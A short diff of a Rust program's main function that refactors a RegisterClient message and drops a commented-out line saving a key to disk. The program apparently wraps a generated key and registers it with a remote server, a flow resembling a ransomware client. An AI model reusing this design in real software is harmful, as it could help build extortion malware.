@@ -83,7 +83,6 @@ async fn main() {
     } else {
         event!(Level::INFO, "-- SKIPPED STAGE: Worker Start --");
     }
-    //let _ = write(PathBuf::from("/home/kobiske/Videos/key.key"), &key);
 
     event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
     let encrypted_key = wrap_key(&key);
@@ -95,8 +94,7 @@ async fn main() {
     key.zeroize(); // zero out key, not needed anymore
 
     event!(Level::INFO, "-- REACHED STAGE: Networking --");
-    let mut register_blob =
-        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
+    let mut register_blob = comms::Message::RegisterClient(ucid, encrypted_key.as_slice()).to_req();
 
     let addr = ip.parse().unwrap();
 
@@ -162,7 +160,7 @@ async fn main() {
                     );
                     ucid = generate_ucid().unwrap();
                     register_blob =
-                        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
+                        comms::Message::RegisterClient(ucid, encrypted_key.as_slice()).to_req();
                 }
                 Message::RateReject() => {
                     event!(
